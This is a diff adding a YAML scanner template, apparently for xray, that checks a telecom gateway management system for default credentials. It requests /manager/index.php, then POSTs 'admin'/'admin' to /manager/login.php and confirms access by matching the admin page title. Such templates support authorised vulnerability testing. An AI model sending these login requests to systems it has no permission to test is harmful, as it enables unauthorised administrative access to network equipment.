@@ -1,0 +1,26 @@
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+  - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+expression: r0() && r1()
+manual: true
+name: poc-yaml-telecom-gateway-default-password
+rules:
+  r0:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /manager/index.php
+  r1:
+    expression: "response.status == 200 && response.body.bcontains(b\"<title>\u7535\
+      \u4FE1\u7F51\u5173\u670D\u52A1\u5668\u7BA1\u7406\u540E\u53F0</title>\") && response.body.bcontains(b\"\
+      index-shang.php\") && response.body.bcontains(b\"di.php\")"
+    request:
+      body: Name=admin&Pass=admin
+      cache: true
+      follow_redirects: true
+      method: POST
+      path: /manager/login.php
+transport: http
